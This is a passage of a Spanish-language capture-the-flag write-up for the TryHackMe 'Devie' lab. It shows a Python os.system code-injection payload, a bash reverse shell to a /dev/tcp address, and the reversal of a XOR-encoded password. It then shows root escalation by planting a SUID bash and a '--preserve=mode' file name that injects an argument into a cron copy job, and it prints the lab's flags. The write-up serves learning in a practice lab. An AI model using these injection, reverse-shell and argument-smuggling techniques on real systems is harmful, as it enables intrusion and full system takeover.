


- Lanzamos la petición de la máquina remota
```
__import__('os').system('ping -c3 10.10.218.246')#
```


- En la máquina de ataque, esuchamos el ping que viene del remoto
```
tcpdump -i ens5 -v icmp and 'icmp[icmptype]=icmp-echo'
```

- Podemos intentar lanzar un remote shell

```
__import__('os').system("bash -c 'bash i >& /dev/tcp/10.10.218.246/1433 0>&1'")#

__import__('os').system("bash -c 'bash+-i+>%26+/dev/tcp/10.10.218.246/1433+0>%261'")#

```

- ya que estamos dentro vemos los permisos de sudo
```bash
/home/bruce$ sudo -l
Matching Defaults entries for bruce on devie:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User bruce may run the following commands on devie:
    (gordon) NOPASSWD: /usr/bin/python3 /opt/encrypt.py
```
- ejecutamos el programa
```
/home/bruce$ sudo -u gordon /usr/bin/python3 /opt/encrypt.py
Enter a password to encrypt: esteesungranpassword
FgYEABcAEA0VFxUFFRgLHAUXHRY=
```

- idemos una forma de revertir el cifrado y obtener la llave
```python
import base64

password="esteesungranpassword"

base64_string = "FgYEABcAEA0VFxUFFRgLHAUXHRY="
base64_bytes  = base64_string.encode("ascii")

sample_string_bytes = base64.b64decode(base64_bytes)

key = sample_string_bytes.decode("ascii")

xored = ""

for i in range(0, len(password)):
        xored += chr(ord(password[i]) ^ ord(key[ i%len(key) ]))

print(xored)
```

- sacamos la llave
```
/home/bruce$ python3 exp.py
supersecretkeyxorxor
```

- revisamos la nota 
```bash
/home/bruce$ cat note
Hello Bruce,

I have encoded my password using the super secure XOR format.

I made the key quite lengthy and spiced it up with some base64 at the end to make it even more secure. I'll share the decoding script for it soon. However, you can use my script located in the /opt/ directory.

For now look at this super secure string:
NEUEDTIeN1MRDg5K

Gordon
```

- desencriptamos los que nos dan
```
sudo -u gordon /usr/bin/python3 /opt/encrypt.py
Enter a password to encrypt: NEUEDTIeN1MRDg5K
PTAlIDYnLAY8VDk5IR5NJA==

G0th@mR0ckz!
```

- nos pasamos a gordon
```bash
ssword:
gordon@devie:/home/bruce$
gordon@devie:/home/bruce$ ls
checklist  exp.py  flag1.txt  hola  note  test
gordon@devie:/home/bruce$ cd /home/gordon/
gordon@devie:~$ ls
backups  flag2.txt  reports
gordon@devie:~$ cat flag2.txt
THM{X0R_XoR_XOr_xOr}
gordon@devie:~$
```

- revisar los archivos de gordon y encontramos `backup`
```bash
gordon@devie:~$ find / -user gordon -type f 2>/dev/null | grep -v 'proc\|sys'
/tmp/pspy64
/home/gordon/.profile
/home/gordon/.viminfo
/home/gordon/.bash_logout
/home/gordon/.cache/motd.legal-displayed
/home/gordon/.bashrc

gordon@devie:~$ find / -group gordon -type f 2>/dev/null | grep -v 'proc\|sys'
/opt/encrypt.py
/tmp/pspy64
/usr/bin/backup
/home/gordon/.profile
/home/gordon/.viminfo
/home/gordon/flag2.txt
/home/gordon/reports/report2
/home/gordon/reports/report1
/home/gordon/reports/report3
/home/gordon/.bash_logout
/home/gordon/.cache/motd.legal-displayed
/home/gordon/.bashrc
gordon@devie:~$
```

- la otra forma con pspy64

```
gordon@devie:/tmp$ ./pspy64

2023/04/03 19:56:18 CMD: UID=0     PID=1      | /sbin/init maybe-ubiquity
2023/04/03 19:57:01 CMD: UID=0     PID=2649   | /usr/sbin/CRON -f
2023/04/03 19:57:01 CMD: UID=0     PID=2651   | /usr/bin/bash /usr/bin/backup
2023/04/03 19:57:01 CMD: UID=0     PID=2650   | /bin/sh -c /usr/bin/bash /usr/bin/backup
```

- miramos en el script de backup
```bash
gordon@devie:/tmp$ cat /usr/bin/backup
#!/bin/bash

cd /home/gordon/reports/

cp * /home/gordon/backups/
```

- abusaremos del preservemode para que cuando se copie el bash quede con permisos de root
```bash
gordon@devie:~/reports$ cp /usr/bin/bash .
gordon@devie:~/reports$ chmod u+s bash
gordon@devie:~/reports$ echo "" > "--preserve=mode"
gordon@devie:~/reports$ ls -l
total 1172
-rw-rw-r-- 1 gordon gordon       1 Apr  3 20:04 '--preserve=mode'
-rwsr-xr-x 1 gordon gordon 1183448 Apr  3 20:03  bash
-rw-r--r-- 1    640 gordon      57 Feb 19 23:31  report1
-rw-r--r-- 1    640 gordon      72 Feb 19 23:32  report2
-rw-r--r-- 1    640 gordon     100 Feb 19 23:33  report3
gordon@devie:~/reports$
```

- hay que esperar que el proceso de respaldo funcione y luego ir
```bash
gordon@devie:~/backups$ ./bash -p
bash-5.0# cd /root/
bash-5.0# ls
root.txt  snap
bash-5.0# cat root.txt
THM{J0k3r$_Ar3_W1ld}
bash-5.0#

```



## Tools
- https://pwncat.org/
- 